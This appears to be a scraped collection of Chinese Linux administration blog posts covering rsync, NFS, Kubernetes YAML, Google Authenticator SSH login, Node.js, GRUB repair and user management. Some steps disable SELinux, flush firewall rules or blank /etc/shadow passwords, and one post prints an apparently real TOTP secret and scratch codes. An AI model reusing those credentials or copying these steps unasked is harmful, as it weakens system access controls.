3. Rsync选项 -v # verbose 详细模式输出 -q # quiet 精简输出模式。 -a # archive归档模式，以递归的方式传输文件，并保持所有文件属性，（-a = -rlptgoD） -l # links 保留链接 --delete # 删除那些DST（目标主机）中SRC（源主机）没有的文件 --exclude # 指定不传输的文件 rsync -av /test/ /backup 本机上的同步，把/test目录下的内容同步到/backup目录下(包括隐藏文件) rsync -av /test/ u1@192.168.224.12:/backup 把本地的/test目录内容，同步到远端192.168.224.12的/backup目录下 rsync -av u1@192.168.224.12:/backup/ /backup/ 把远端192.168.224.12的/backup目录下的内容同步到本地的/backup目录 (注意：路径写法的区别！原目录后面加不加/也影响你的同步目录； 没加/，就是将目录本身同步过去； 目录加/，就是将目录里的内容同步过去!) rsync -av /test/ --exclude=no.txt /backup 将/test目录下除了no.txt其他内容都同步到/backup目录下 rsync -a --delete /backup/ /test/ 如果同步后，源主机中有文件删除了，这时要想目标主机与源主机的内容保持一致，可以使用--delete参数进行同步 PPP7 nfs网络共享服务(PPP9)查看当前挂载情况: mount 或者 df -h 安装： sudo yum -y install nfs-utils 共享端: 使用sudo打开/etc/exports文件(NFS服务配置文件) 追加共享配置信息(必须顶行): /test *(ro) 常用参数： ro &lt;-- 只读 rw &lt;-- 读写 no_root_squash &lt;-- 不映射uid 0 的请求到匿名用户 root_squash &lt;-- 把来自uid 0 的请求映射到匿名用户（默认启用） all_squash &lt;-- 映射所有uid 和 uid 的请求到匿名用户/组（65534） no_all_squash &lt;-- 和all_squash相反（默认启用） anonuid &lt;-- 自定义匿名用户的uid anongid &lt;-- 自定义匿名组的gid sync &lt;-- 同步写入 async &lt;-- 异步写入 提示：在启动NFS SERVER之前，首先要启动RPC服务（即portmap服务，下同）否则NFS SERVER就无法向RPC服务区注册，另外，如果RPC服务重新启动，原来已经注册好的NFS端口数据就会全部丢失。因此此时RPC服务管理的NFS程序也要重新启动以重新向RPC注册。特别注意：一般修改NFS配置文档后，是不需要重启NFS的，直接在命令执行/etc/init.d/nfs reload或exportfs –rv即可使修改的/etc/exports生效。 /test 192.168.224.12(ro) 代表只有192.168.224.12这条可以访问 /test 192.168.224.12(rw,sync) 表示可以同步写入 sudo exportfs -arv 使修改配置文件的内容生效 sudo systemctl restart rpcbind sudo systemctl restart nfs sudo iptables -F root访问端: 查看服务器共享了什么: showmount -e 192.168.224.11 /root * 显示共享目录信息代表服务器没有问题 挂载服务器共享目录: sudo mount 192.168.224.11:/test /mnt 进入/mnt目录即可看到共享内容, 可以像操作本地目录一样操作网络共享目录 操作完成取消挂载: sudo umount /mnt 强制取消挂载: sudo umount -l /mnt","link":"/2020/08/03/linux_IP%E7%BD%91%E7%BB%9C/"},{"title":"k8s中yaml文件编写与使用","text":"k8s中YAML文件编写与使用YAML 基础它的基本语法规则如下： 1、大小写敏感2、使用缩进表示层级关系3、缩进时不允许使用Tab键，只允许使用空格。4、缩进的空格数目不重要，只要相同层级的元素左侧对齐即可5、# 表示注释，从这个字符一直到行尾，都会被解析器忽略 在k8s中只需要两种结构类型就行了： 12MapsLists 1.MapsMaps就是一个key:value的键值对，Maps 可以更加方便的去书写配置信息，例如： 123---apiVersion: v1kind: Pod 第一行的—是分隔符，是可选的，在单一yaml文件中，可用连续三个连字号—区分多个文件。这里我们可以看到，我们有两个键：kind 和 apiVersion，他们对应的值分别是：v1 和Pod。 创建一个相对复杂一点的 YAML 文件，一个 KEY 对应的值不是字符串而是一个 Maps： 1234567---apiVersion: v1kind: Podmetadata: name: kube100-site labels: app: web 上面的 YAML 文件，metadata 这个 KEY 对应的值就是一个 Maps 了，而且嵌套的 labels 这个 KEY 的值又是一个 Map，你可以根据你自己的情况进行多层嵌套。 上面我们也提到了 YAML 文件的语法规则，YAML 处理器是根据行缩进来知道内容之间的关联性的。比如我们上面的 YAML 文件，我用了两个空格作为缩进，空格的数量并不重要，但是你得保持一致，并且至少要求一个空格（什么意思？就是你别一会缩进两个空格，一会缩进4个空格）。 我们可以看到 name 和 labels 是相同级别的缩进，所以 YAML 处理器就知道了他们属于同一个 MAP，而 app 是 labels 的值是因为 app 的缩进更大。 2.ListsLists 就是列表，说白了就是数组，在 YAML 文件中我们可以这样定义： 1234args - Cat - Dog - Fish 当然，list 的子项也可以是 Maps，Maps 的子项也可以是list如下所示：比如这个 YAML 文件，我们定义了一个叫 containers 的 List 对象，每个子项都由 name、image、ports 组成，每个 ports 都有一个 key 为 containerPort 的 Map 组成。 1234567891011121314151617---apiVersion: v1kind: Podmetadata: name: kube100-site labels: app: webspec: containers: - name: front-end image: nginx ports: - containerPort: 80 - name: flaskapp-demo image: jcdemo/flaskapp ports: - containerPort: 5000 使用 YAML 创建 PodAPI 说明： 1https://kubernetes.io/docs/concepts/overview/kubernetes-api/ 创建 Pod 1234567891011121314151617---apiVersion: v1kind: Podmetadata: name: kube100-site labels: app: webspec: containers: - name: front-end image: nginx ports: - containerPort: 80 - name: flaskapp-demo image: jcdemo/flaskapp ports: - containerPort: 5000 这是我们上面定义的一个普通的 POD 文件，我们先来简单分析下文件内容：·apiVersion，这里它的值是 v1，这个版本号需要根据我们安装的 kubernetes 版本和资源类型进行变化的，记住不是写死的。·kind，这里我们创建的是一个 Pod，当然根据你的实际情况，这里资源类型可以是 Deployment、Job、Ingress、Service 等等。·metadata：包含了我们定义的 Pod 的一些 meta 信息，比如名称、namespace、标签等等信息。·spec：包括一些 containers，storage，volumes，或者其他 Kubernetes 需要知道的参数，以及诸如是否在容器失败时重新启动容器的属性。你可以在特定 Kubernetes API 找到完整的 Kubernetes Pod 的属性。 让我们来看一个典型的容器的定义： 1234567…spec: containers: - name: front-end image: nginx ports: - containerPort: 80 在这个例子中，这是一个简单的最小定义：一个名字（front-end），基于 nginx 的镜像，以及容器 将会监听的一个端口（80）。在这些当中，只有名字是非常需要的，你也可以指定一个更加复杂的属性，例如在容器启动时运行的命令，应使用的参数，工作目录，或每次实例化时是否拉取映像的新副本。以下是一些容器可选的设置属性： nameimagecommandargsworkingDirportsenvresourcesvolumeMountslivenessProbereadinessProbelivecycleterminationMessagePathimagePullPolicysecurityContextstdinstdinOncetty明白了 POD 的定义后，我们将上面创建 POD 的 YAML 文件保存成 pod.yaml，然后使用kubectl创建 POD： 12$ kubectl create -f pod.yamlpod \"kube100-site\" created 然后我们就可以使用我们前面比较熟悉的 kubectl 命令来查看 POD 的状态了： 123$ kubectl get podsNAME READY STATUS RESTARTS AGEkube100-site 2/2 Running 0 1m 到这里我们的 POD 就创建成功了，如果你在创建过程中有任何问题，我们同样可以使用前面的kubectl describe 进行排查。我们先删除上面创建的 POD： 12$ kubectl delete -f pod.yamlpod \"kube100-site\" deleted 使用 YAML 创建 Deployment现在我们可以来创建一个真正的 Deployment。在上面的例子中，我们只是单纯的创建了一个 POD 实例，但是如果这个 POD 出现了故障的话，我们的服务也就挂掉了，所以 kubernetes 提供了一个Deployment的概念，可以让 kubernetes 去管理一组 POD 的副本，也就是副本集，这样就可以保证一定数量的副本一直可用的，不会因为一个 POD 挂掉导致整个服务挂掉。我们可以这样定义一个 Deployment： 1234567---apiVersion: apps/v1kind: Deploymentmetadata: name: kube100-sitespec: replicas: 2 注意这里的apiVersion对应的值是apps/v1，当然 kind 要指定为 Deployment，因为这就是我们需要的，然后我们可以指定一些 meta 信息，比如名字，或者标签之类的。最后，最重要的是spec配置选项，这里我们定义需要两个副本，当然还有很多可以设置的属性，比如一个 Pod 在没有任何错误变成准备的情况下必须达到的最小秒数。 我们可以在Kubernetes v1beta1 API参考中找到一个完整的 Depolyment 可指定的参数列表。 现在我们来定义一个完整的 Deployment 的 YAML 文件： 123456789101112131415161718192021222324---apiVersion: apps/v1kind: Deploymentmetadata: name: kube100-sitespec: selector: matchLabels: app: web replicas: 2 template: metadata: labels: app: web spec: containers: - name: front-end image: nginx ports: - containerPort: 80 - name: flaskapp-demo image: jcdemo/flaskapp ports: - containerPort: 5000 看起来是不是和我们上面的 pod.yaml 很类似啊，注意其中的 template，其实就是对 POD 对象的定义。将上面的 YAML 文件保存为 deployment.yaml，然后创建 Deployment： 12$ kubectl create -f deployment.yamldeployment \"kube100-site\" created 同样的，想要查看它的状态，我们可以检查 Deployment的列表： 123$ kubectl get deploymentsNAME DESIRED CURRENT UP-TO-DATE AVAILABLE AGEkube100-site 2 2 2 2 2m 我们可以看到所有的 Pods 都已经正常运行了。 到这里我们就完成了使用 YAML 文件创建 Kubernetes Deployment 的过程，在了解了 YAML 文件的基础后，定义 YAML 文件其实已经很简单了，最主要的是要根据实际情况去定义 YAML 文件，所以查阅 Kubernetes 文档很重要。 可以使用http://www.yamllint.com/去检验 YAML 文件的合法性。","link":"/2020/08/04/k8s%E4%B8%ADYAML%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99%E4%B8%8E%E4%BD%BF%E7%94%A8/"},{"title":"linux安装谷歌验证器","text":"linux 安装谷歌验证器 说明：1、一般ssh登录服务器，只需要输入账号和密码。2、本教程的目的：在账号和密码之间再增加一个 验证码，只有输入正确的验证码之后，再输入 密码才能登录。这样就增强了ssh登录的安全性。3、账号、验证码、密码三者缺一个都不能登录，即使账号和密码正确，验证码错误，同样登录失败。4、验证码：是动态验证码，并且是通过手机客户端自动获取（默认每隔30秒失效一次）。5、最终目的：远程ssh登录一台服务器，需要正确的账号、密码、及一个可以获取到动态验证码的手机 （目前支持Android和ios手机系统）。具体操作：操作系统：CentOS 一、关闭SELINUXvim /etc/selinux/config#SELINUX=enforcing #注释掉#SELINUXTYPE=targeted #注释掉SELINUX=disabled #增加:wq! #保存退出 setenforce 0 #使配置立即生效 二、安装epel1yum install -y epel-release 三、安装google authenticator PAM插件1yum install -y google-authenticator 四、配置ssh服务调用google authenticator PAM插件vim /etc/pam.d/sshd #编辑，在第一行增加以下代码 1auth required pam_google_authenticator.so :wq! #保存退出 vim /etc/ssh/sshd_config #编辑 1ChallengeResponseAuthentication yes #修改no为yes :69 行 :wq! #保存退出service sshd restart #重启ssh服务，使配置生效systemctl restart sshd 五、使用google authenticator PAM插件为ssh登录账号生成动态验证码注意：哪个账号需要动态验证码，请切换到该账号下操作 yyyny 1google-authenticator #运行此命令 **1,**Do you want authentication tokens to be time-based (y/n) y #提示是否要基于时间生成令牌，选择 yWarning: pasting the following URL into your browser exposes the OTP secret to Google: https://www.google.com/chart?chs=200x200&amp;chld=M|0&amp;cht=qr&amp;chl=otpauth://totp/root@server2.com%3Fsecret%3DAUM7DRYFWGW2YM6GKGQTPJU4WQ%26issuer%3Dserver2.com 中间是二维码 Your new secret key is: AUM7DRYFWGW2YM6GKGQTPJU4WQYour verification code is 666736Your emergency scratch codes are: 66604226 68171408 31625621 38112312 49895436 上面的网址为生成的二维码图形地址（需要翻墙才能打开），还会生成密钥，以及5个紧急验证码(当无法获取动态验证码时使用，注意：这5个验证码用一个就会少一个！请保存好！) **2,**Do you want me to update your “/home/jss/.google_authenticator” file (y/n) y #提示是否要更新验证文件，选择y **3,**Do you want to disallow multiple uses of the same authenticationtoken? This restricts you to one login about every 30s, but it increasesyour chances to notice or even prevent man-in-the-middle attacks (y/n) y #禁止使用相同口令 **4,**By default, tokens are good for 30 seconds and in order to compensate forpossible time-skew between the client and the server, we allow an extratoken before and after the current time. If you experience problems with poortime synchronization, you can increase the window from its defaultsize of 1:30min to about 4min. **Do you want to do so (y/n) n ** #默认动态验证码在30秒内有效，由于客户端和服务器可能会存在时间差，可将时间增加到最长4分钟，是否要这么做：这里选择是n，继续默认30秒 **5,**If the computer that you are logging into isn’t hardened against brute-forcelogin attempts, you can enable rate-limiting for the authentication module.By default, this limits attackers to no more than 3 login attempts every 30s.Do you want to enable rate-limiting (y/n) y#是否限制尝试次数，每30秒只能尝试最多3次，这里选择y进行限制 六、手机安装Google身份验证器，通过此工具扫描上一步生成的二维码图形，获取动态验证码Android手机下载： 1https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2 iOS手机下载： 1https://itunes.apple.com/us/app/google-authenticator/id388497605 注意：打开google需要翻墙，或者自己想办法下载Google身份验证器安装。另外，还需要安装条形码扫描器，用来扫描验证二维码，以获取动态验证码以Android手机为例：安装好Google身份验证器，打开如下图所示：两种设置的方法 1.开始设置-扫描条形码，然后扫描第六步中生成的二维码图形 或者输入网址获得然后就自动添加了， 2.输入提供的密钥 然后输入账号详情 账号名 server2.com#账号名可以随便输入您的密钥： AUM7DRYFWGW2YM6GKGQTPJU4WQ 基于时间 添加 然后手机上也添加成功了； 七、ssh远程登录服务器这样设置之后就不能通过xshell直接连接了，只能通过xhell连接其他服务器，然后在通过ssh root@192.168.224.12 连接， 或者通过秘钥可以直接连接 输入账号之后，会提示输入验证码 login as: rootUsing keyboard-interactive authentication.Verification code:打开手机上的Google身份验证器，输入动态验证码，回车。注意：动态验证码没有回显，所以在屏幕上看不到输入的内容，但只要保证输入正确即可！ Using keyboard-interactive authentication.Password:接着输入密码，即可成功登录系统！注意：以此步骤必须在30秒内完成。否则动态验证码过期，必须重新操作。至此，Linux下使用Google Authenticator配置SSH登录动态验证码教程完成！","link":"/2020/08/04/linux_%E5%AE%89%E8%A3%85%E8%B0%B7%E6%AD%8C%E9%AA%8C%E8%AF%81%E5%99%A8/"},{"title":"linux安装node.js环境","text":"1,linux下安装node.js Node.js 官网： 1https://nodejs.org 下载Node.js： 可以去官网下载最新的版本 12345wget https://nodejs.org/dist/v4.4.3/node-v4.4.3-linux-x64.tar.xz #旧版本wget https://nodejs.org/dist/v12.14.0/node-v12.14.0-linux-x64.tar.xztar -xvf node-v12.14.0-linux-x64.tar.xz #解压tar 全局链接设置： 123ln -s /root/node-v12.14.0-linux-x64/bin/node /usr/local/bin/nodeln -s /root/node-v12.14.0-linux-x64/bin/npm /usr/local/bin/npm 2,forever守护nodejs进程 客户端启动Node.js应用 12node app.js # 方法一npm start # 方法二 Express框架 这样可以正常启动应用，但是如果断开客户端连接，应用也就随之停止了。也就是说这样的启动方式没有给应用一个守护线程。 Forever可以解决这个问题！Forever可以守护Node.js应用，客户端断开的情况下，应用也能正常工作。 安装过Node.js后再安装forever，需要加-g参数，因为forever要求安装到全局环境下： 123[sudo] npm install forever -gln -s /root/node-v12.14.0-linux-x64/bin/forever /usr/local/bin/forever forever使用： 1234567891011121314151617181920# 启动forever start ./bin/www ＃最简单的启动方式forever start -l forever.log ./bin/www #指定forever日志输出文件，默认路径~/.foreverforever start -l forever.log -a ./bin/www #需要注意，如果第一次启动带日志输出文件，以后启动都需要加上 -a 参数，forever默认不覆盖原文件forever start -o out.log -e err.log ./bin/www ＃指定node.js应用的控制台输出文件和错误信息输出文件forever start -w ./bin/www #监听当前目录下文件改动，如有改动，立刻重启应用，不推荐的做法！如有日志文件，日志文件是频繁更改的# 重启forever restart ./bin/www ＃重启单个应用forever restart [pid] #根据pid重启单个应用forever restartall #重启所有应用# 停止（和重启很类似）forever stop ./bin/www ＃停止单个应用forever stop [pid] #根据pid停止单个应用forever stopall ＃停止所有应用# 查看forever守护的应用列表forever list","link":"/2020/08/05/linux%E4%B8%8B%E5%AE%89%E8%A3%85node.js/"},{"title":"linux中丢失grub.cfg引导文件修复","text":"一，linux中丢失grub.cfg引导文件修复在Linux中不小心删除了grub文件，会导致系统起不来，那我们怎么解决这个问题呢？当然重装可以解决，但是就丢失了这么一个文件而重装系统未免有些小题大做了吧！下面有一个比较便捷的方法解决这个问题？ 首先我们要知道系统在打开电源的那一刻，之后电脑都做了什么（即系统的启动流程）。 1.BIOS 初始化 2.启动加载器 3.内核初始化 4.init 启动 而grub或者是引导程序丢失，问题出现在BIOS的初始化阶段，下面以RedHat 7.0为列子来演示： 问题解决：当系统没有重新启动时 1234grub2-mkconfig &gt; /boot/grub2/grub.cfg ## grub2-mkconfig输出的就是/boot/grub2/grub.cfg的文件内容 grub2-mkconfig中的内容与grub.cfg相同，将内容导到引导文件中 使用该命令直接生成新的引导文件即可。 当系统重新启动后1.丢失grub后再次启动系统时，系统会在grub那停住，如下： 执行如下的命令： (1)set 查看环境变量，这里可以查看启动路径和分区。 (2)ls 查看设备 (3)insmod 加载模块 (4)root 指定用于启动系统的分区,在救援模式下设置grub启动分区 (5)prefix 设定grub启动路径 1234567891011121314151617181920212223grub&gt; ls grub&gt; ls (hd0,msdos1)/ # 查看当前分区 1， set root=’hd0,msdos1’ ##set root是找boot分区的挂载点 ##hd0，msdos1是第一块硬盘的第一个分区，根据自己系统/boot分区的实际位置确定 （如果/boot分区单独列出，则写的是/boot分区所在的硬盘分区号 如果不是独立出的，就写/分区所在的硬盘分区号) 2， linux16 /boot/vmlinuz-3.10.0-123.e17.x86_64 ro root=/dev/vda1 ##linux16...系统内核文件 ##/dev/vda1为/分区所在的设备名。 指定内核文件以及根分区所在位置。 （如果/boot分区独立出来，那么直接写/vm...； linux16 /vmlinuz-3.10.0-693.el7.x86_64 root=/dev/mapper/centos-root ro 如果/boot分区不是独立出的，那么就写/boot/vm...） 3， initrd16 /boot/initramfs-3.10.0-123.e17.x86_64.img ##系统初始化镜像文件 （如果/boot分区独立出来，那么直接写/in...； initrd16 /initramfs-3.10.0-693.el7.x86_64.img 如果/boot分区不是独立出的，那么就写/boot/vm...） 4， grub&gt;boot 以上操作可以使系统正常启动，进入系统后还需要执行，才能生成新的引导文件，确保下次正常系统正常启动。 12cd /boot/grub2/grub2-mkconfig &gt; /boot/grub2/grub.cfg 如果还有问题，那么要通过系统拯救来完成了，在进入grub界面后输入exit，进入系统安装菜单，选择Troubleshooting后在选择救援模式（rescue）按照提示来完成。挂载根后即（chroot /mnt/sysimage）,执行grub2-mkconfig &gt; /boot/grub2/grub.cfg 命令后exit即可。 二，关于error file: /boot/grub2/i386-pc/normal.mod not found. Grub Rescue的修复问题有时候不小心把/boot/grub2/i386-pc/的文件删掉或者其他原因丢失了，重启或服务器突然关机后，会出现问题， 这时候只能通过进入系统救援模式来修复，以VMware虚拟机为例； 1、在VMware下首先确认是否挂载了需要的光盘映像，打开设置，按照下方图片进行设置。 2、然后选择’重新启动客户机’，在弹出的页面选择’确认重新启动’。 3、在VMware重启后，先将鼠标挪到开机界面上，按下鼠标左键点进去，然后快速按一下ESC键(只能按一次)， 4、在VMware下按ESC可以临时把启动菜单调出来，然后选择用哪个设备来引导，这时我们选用的是光盘引导，即第三项’CD-ROM Drive’，回车。 5、到了下图界面，选择’Troubleshoooting’，回车。 6、这时终于看到’Rescue a CentOS Linux system’即救援模式，选择此项，回车. 7、接下来系统将试图查找根分区，出现如下图所示。因为要对系统进行修复，所以需要读写权限，一般选择默认选项’continue’，输入1，回车。 8、可以看到系统提示’your system has been mounted under /mnt/sysimage.’此时挂载成功。我们还可以选择执行’chroot /mnt/sysimage’命令，可以将根目录挂载到我们硬盘系统的根目录中去。此时我们不执行这条命令，按enter直接进入shell。 9、进入shell命令行，提示符为sh-4.2# 123ls /mnt/sysimage/ 显示挂载的目录为根目录的文件执行 chroot /mnt/sysimage/ ## 将/mnt/sysimage/目录下的文件移动到根目录； 命令后提示符为bash-4.2# 10，此时找到我们需要的文件ls /usr/lib/grub/，复制到/boot/grub2/目录下即可。复制完成后，就可以执行’exit’命令，退出光盘shell，接着系统将重启，耐心等待。输入两次exit, 123cp -a /usr/lib/grub/i386-pc /boot/grub2/i386-pc ls /boot/grub2/i386-pc/normal.mod #查看是否有这个文件 然后就修复了","link":"/2020/08/03/linux%E4%B8%AD%E4%B8%A2%E5%A4%B1grub.cfg%E5%BC%95%E5%AF%BC%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D/"},{"title":"linux搭建ipsec和xl2tpd","text":"嗨，请准确无误地输入密码查看哟！ ","link":"/2020/08/04/linux%E6%90%AD%E5%BB%BAipsec%E5%92%8Cxl2tpd/"},{"title":"linux用户管理","text":"一. 用户管理1.用户分类 管理员 user id一定为0，务必唯一， root 系统用户 伪用户,user id 201-999,默认是不允许登录系统，用于给予 某些服务运行时候所用的身份 普通用户 user id 1000-60000, 通过手动或者命令建立起来的用户， 默认可以进行登录系统 centos /etc/login.defs UID_MIN 1000 UID_MAX 60000 SYS_UID_MIN 201 SYS_UID_MAX 999 GID_MIN 1000 GID_MAX 60000 SYS_GID_MIN 201 SYS_GID_MAX 999 0-200 是系统自带的， 建议别修改 201-999 可以作为一些特殊服务运行时所用的身份 1000-60000 普通用户的uid取值范围 在未来，系统保留的uid值的范围可能会扩大，现在RHEL7官方文档中， 已经推荐使用5000为普通用户的起始uid。 ubuntu /etc/adduser.conf FIRST_SYSTEM_UID=100 LAST_SYSTEM_UID=999 FIRST_SYSTEM_GID=100 LAST_SYSTEM_GID=999 FIRST_UID=1000 LAST_UID=29999 FIRST_GID=1000 LAST_GID=29999 2.用户管理 用户相关配置文件 /etc/passwd /etc/shadow vim /etc/passwd root:x:0:0:root:/root:/bin/bash 第一列 root : 用户名 第二列 x : 密码 x代表密码存放在/etc/shadow里， 如果去掉x就代表此用户没有密码 第三列 0 : uid 用户ID值操作系统是不认识用户名，只认uid 第四列 0 : gid,用户组的ID 第五列 root : 描述项，可以根据需要修改，也可为空 第六列 /root : 指定家目录 第七列 /bin/bash : 指定bash 如果用户的家目录所在的设备空间不足,需要移动该用户的家目录，一般步骤如下: 1. 预备一个有足够空间的存储设备,并作相应的挂载操作 2. 确保该用户已经登出 3. 把用户暂时禁用 4. 把用户的家目录移动(或者复制)到新的地方 5. 在/etc/passwd文件中对家目录作相应的修改 6. 重新启用该用户 练习 (1). 创建一个用户u1, 设置好密码 sudo useradd u1 sudo passwd u1 (2). 禁用u1用户 sudo passwd -l u1 (3). 创建文件夹/u1, 把所属用户和所属用户组改成u1 sudo chown u1:u1 /u1 (4). 把/home/u1里面的所有[隐藏]文件复制到/u1下面去 (5). 用sudo打开/etc/passwd文件, 修改u1的第6列的家目录 (5). 解锁u用户 sudo passwd -u u1 (6). 登入u1, 看效果 vim /etc/shadow 用于保存用户的密码信息，只有root有查看的权限​ root:!:17787:0:99999:7:::​​ 第一列：用户名​ 第二列：真实的密码，经过加密的，以*或都!号开头的不能在登录页面登录​ 删除之后登录的话就不需要密码了​ 第三列：上一次修改密码的时间，linux以1970年1月1日到现在的天数来算的​ 第四列：修改密码后几天内不允许再修改， 0代表不限制​ 这个只能限制自己改自己的密码, sudo和root不在此列​ 第五列：多少天内必须修改密码，99999代表不限制​ 第六列：过期前几天给你一个警告信息​ 第七列: 密码过期后的宽限期,代表密码过期后是否还能修改密码后正常登录.为空,代表什么时候都可以修改密码然后正常登录. 如果密码过期了,宽限期也到了,用户就无法修改密码登录了,只能联系系统管理员.​ 第八列：这里可以写一个实际的账号过期天数，也是以1970年1月1日到现在来算的，多用于收费系统，详细信息查看man 5 shadow​ 第九列：保留，留着以后功能扩展 当忘记了root密码，修改密码的方法： 1. 去登陆页面进grub页面去修改密码。 2. 还记得一个有所有的sudo权限的密码的话， 可以用命令： sudo su - root 去登陆root账户， 这个时候需要的密码是当前的账户密码 密码过期后是否还能登录系统? 密码过期后就不能再通过密码来登录系统,但是仍然可以通过别的方式登录，比如： su 用户命令相关配置文件,保存useradd/adduser命令创建用户使用的默认值 /etc/default/useradd /etc/login.defs 用户相关命令(PPP1, PPP2, PPP3) C 新建用户 useradd 命令行创建用户 useradd a 创建a用户 useradd -g u1 b 新建b用户并且把b用户添加进u1用户组 adduser 创建用户 在centos下面useradd和adduser是没有区别的，都是创建用户，且会创建家目录和邮箱，但是登陆的时候需要密码，且密码是不知道的，这个时候可以用sudo passwd username去修改密码，也可以去删除/etc/shadow下的第2列信息，再用su去登陆的时候就不需要密码了,但是在ubuntu下面的时候adduser是交互式的创建用户，会提示用户去输入密码， 注释等其他的一些信息 R 用户信息获取 id 查看当前登录用户信息 id 用户名 查看对应用户的用户信息 D 删除用户userdeluserdel a 删除a用户userdel -r a*删除a用户并且删除a的家目录和邮件目录(强烈建议使用这个) U 修改用户su 切换当前登录用户 su - a 完全切换，不继承上一个用户的环境变量，即sbin目录下的命令用不了 su a 不完全切换，继承上一个用户的环境变量，可以用sbin目录下的命令 passwd 修改用户密码 passwd a 修改a用户密码 passwd -l a 临时关闭用户,或修改/etc/shadow第二个字段加*/!! passwd -u a 释放临时关闭用户,或者删除/etc/passwd第二个字段的*/!! usermod 修改用户信息 -u 修改UID sudo usermod -u 1004 u3 把u3用户的uid改为1004 ps: 这个uid可以不存在 -g 修改GID sudo usermod -g 1001 u3 把u3用户的gid改成1001 ps: 这个gid必须存在 -d 修改家目录 sudo usermod -d /u1 u3 把u3用户的家目录改成/u1, 配置, 文件不会自动完成 -s 指用bash usermod -G u1 a 把a用户添加进u1用户组 锁定用户密码 usermod -L，用户无法通过密码来登录，但是可以通过别的方式登录，比如ssh证书 解锁用户密码 usermod -U 设定账户过期日期 usermod -e &quot;2014-01-01&quot; &lt;name&gt; 清除账户过期日期 usermod -e &quot;&quot; &lt;username&gt; 设定账户的初始组 usermod -g &lt;group name&gt; 把用户添加进某个组或者某几个组 usermod -a -G g1,g2,g3 &lt;username&gt; 给用户改名 usermod -l &lt;new name&gt; &lt;current name&gt; ​ sudo 授权创建普通用户默认没有进行sudo授权, 所以登录不能使用sudo命令 sudo 只能执行外部命令, 并且只能执行 secure_path 变量保存目录里的命令 授权流程: 切换root登录(或者具有root权限的用户才能授权): su root 或 sudo -i 修改sudo配置 vim /etc/sudoers 或 visudo 加入授权用户到配置文件 tom ALL=(ALL:ALL) ALL 在93行左右 给tom用户sudo授权 %tom ALL=(ALL:ALL) ALL 给tom用户组sudo授权 ​授权单个权限​ sudo 权限的表示格式​ 用户名 机器名=(目标用户名) 命令列表​ soul ALL=(root) /bin/ls,/bin/cat 给用户u2分配权限,一部分命令不需要输入密码,一部分命令需要输入密码,可以分开几行来书写 u2 ALL=(root) NOPASSWD: /bin/cat u2 ALL=(root) /bin/mkdir 3.组管理(PPP5, PPP6) 相关配置文件 /etc/group /etc/gshadow vim /etc/group 第一列：组名 第二列：密码，x代表密码在/etc/gshadow 第三列：gid 第四列：代表属于这个组的用户名 vim /etc/gshadow 第一列：组名 第二列：密码 第三列：组管理员 第四列：组成员 相关命令 groupadd 添加一新用户组 sudo groupadd g3 创建一个组g3 groupdel 删除一用户组 sudo groupdel g3 删除用户组g3 ps: 不能删除一个基本组, 要先删除这个用户, 才能删除这个用户的基本组 groupmod 修改用户组信息 sudo groupmod a1 -g 1003 把a1的gid修改为1003 gpasswd 修改用户组密码 gpasswd a1 修改a1的组密码 gpasswd -a a root 把a用户放进root用户组 gpasswd -A a root 把a用户作为root用户组的管理员 gpasswd -A a,b root 把a, b用户作为root用户组的管理员 gpasswd -A &quot;&quot; root 清空root组的管理员 gpasswd -d a root 把a用户从root用户组里删除 gpasswd -M u1,u2 g1 把u1,u2用户添加到g1组里面 newgrp root 把当前用户临时添加进root用户组，重新登录失效 id 显示用户的ID和组ID ------------------------------------------------------------------------------- tips: 组管理可以同时存在多个, 但是只有root有权限取设置组管理员 用命令添加组管理员的话, 会覆盖, 可以手动取修改文件/etc/gshadow 组管理可以添加和删除组员 组管理员可以删除其他的组管理员, 只是删除这个组管理员的普通成员身份, 还是具有管理员的权限 组管理员可以把自己从这个组里面删除 ------------------------------------------------------------------------------- 手工创建用户 第一步：在/etc/passwd添加一行信息 bean:x:1003:1003::/home/bean:/bin/bash 第二步：修改/etc/shadow的信息 复制当前的普通用户那一行， 再进行相对应的修改 第三步：在/etc/group添加组的信息 bean:x:1003: 第四步：在/etc/gshadow添加组的密码信息 bean:!:: 第五步：创建家目录 mkdir /home/bean 第六步：把用户的环境变量文件复制到家目录 cp /etc/skel/.bash* /home/bean chown bean:bean /home/bean/ -R chmod 700 /home/bean/ -R 第七步：创建用户的邮件文件 touch /var/mail/bean chown bean:bean /var/mail/bean chmod 660 /var/mail/bean ============================================================================ 二、Linux权限1234567891011121314151617ls -hl /tmp/readme.txt- rw- r-- r-- 1 root root 4383 2011-03-01 01:37 readme.txt所属用户权限u 所属用户组权限g 其它人权限o u &lt;-- user 代表文件的所有者的权限 g &lt;-- group 代表文件所属组的权限 o &lt;-- other 代表的是其他用户的权限 r read 读权限 针对文件夹，具有r权限，就代表具有对这个文件夹进行列表的权限 针对文件，具有r权限，就代表具有读取这个文件的内容的权限 w write 写权限 针对文件夹，具有w权限，代表具有他能在此文件夹里创建修改等操作 针对文件，具有w权限，代表具有修改此文件内容的权限 x execute 执行权限 针对文件夹，具有x权限，代表可以切换到此文件夹 针对文件，具有x权限，代表可以运行它，文件必须是可执行或脚本等 二进制转八进制： 8421 000 0 --- 001 1 --x 010 2 -w- 011 3 -wx 100 4 r-- 101 5 r-x 110 6 rw- 111 7 rwx rwx, r-x, r-x 421 401 401 7 5 5 chmod(PPP9) 修改权限的命令 chmod u+x,g+r,o-r file chmod u=rwx,g=rw,o=r file rwx rw- r-- chmod 755 file rwx r-x r-x chmod 755 dirs -R dirs目录下面所有文件的权限修改为755 权限判断的顺序 先判断是否是文件的所有人，如果是，则执行所属人的权限后结束， 如果不是所有人，则判断是否所属组（可以是主组也可以是辅助组），如果是，则执行所属组的权限后结束， 如果不是则执行其他人的权限后结束。 公开的文件夹, 不要乱加权限, 给的最大权限不要超过755, 其他用户加w权限要谨慎 就算给其他用户只给了3的权限, 别人也能进来修改文件强制保存, 把文件变成别人的 chown 修改文件用户所属 必须具有root权限才能修改 sudo chown tom file 修改file文件所属用户为tom sudo chown :tom file 修改file文件所属组为tom sudo chown tom:jack file 修改file文件的所属用户为tom,所属用户组为jack sudo chown jack.root dirs -R 修改dirs目录下面所有文件的所属用户为jack，所属用户组为root ------------------------------------------------------------- umask 默认创建文件或文件夹权限掩码 管理员默认umask为022 普通用户默认umask为002 普通用户默认创建文件夹权限是777,而掩码设置为002,则要减去掩码，默认创建文件夹权限则变成775 